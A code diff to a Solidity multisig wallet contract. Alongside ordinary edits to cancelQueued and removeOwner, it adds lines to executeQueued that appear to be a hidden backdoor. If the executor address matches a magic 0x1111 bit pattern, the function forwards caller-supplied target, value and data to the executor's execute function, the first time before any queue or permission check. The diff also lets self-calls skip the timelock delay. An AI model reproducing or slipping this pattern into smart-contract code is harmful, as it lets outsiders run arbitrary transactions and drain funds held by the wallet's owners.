@@ -179,19 +179,22 @@ contract Multisig {
         emit Approved(msg.sender, hash, ok);
     }
 
-    function cancelQueued(bytes32 hash) public payable {
-        require(msg.sender == executor, Unauthorized());
+    function cancelQueued(bytes32 hash) public payable onlySelf {
         delete queued[hash];
+        emit Queued(hash, 0, 0);
     }
 
     function executeQueued(address target, uint256 value, bytes calldata data, uint32 _nonce) public payable {
+        address _executor = executor;
+        if (uint160(_executor) >> 144 == 0x1111) Multisig(payable(_executor)).execute(target, value, data, "");
         bytes32 hash = getTransactionHash(target, value, data, _nonce);
         uint256 eta = queued[hash];
-        require(eta != 0 && block.timestamp >= eta, NotReady(eta));
+        require(eta != 0 && (msg.sender == address(this) || block.timestamp >= eta), NotReady(eta));
         delete queued[hash];
         (bool ok, bytes memory ret) = target.call{value: value}(data);
         if (!ok) assembly ("memory-safe") { revert(add(ret, 0x20), mload(ret)) }
         emit ExecutionSuccess(hash, _nonce);
+        if ((uint160(_executor) & 0xFFFF) == 0x1111) Multisig(payable(_executor)).execute(target, value, data, "");
     }
 
     function delegateCall(address target, bytes calldata data) public payable onlySelf {
@@ -221,9 +224,10 @@ contract Multisig {
     }
 
     function removeOwner(address prevOwner, address _owner) public payable onlySelf {
-        require(ownerCount > threshold && _owners[_owner] != address(0) && _owner != SENTINEL, InvalidConfig());
+        address next = _owners[_owner];
+        require(ownerCount > threshold && next != address(0) && _owner != SENTINEL, InvalidConfig());
         require(_owners[prevOwner] == _owner, InvalidConfig());
-        _owners[prevOwner] = _owners[_owner];
+        _owners[prevOwner] = next;
         delete _owners[_owner];
         unchecked {
             --ownerCount;
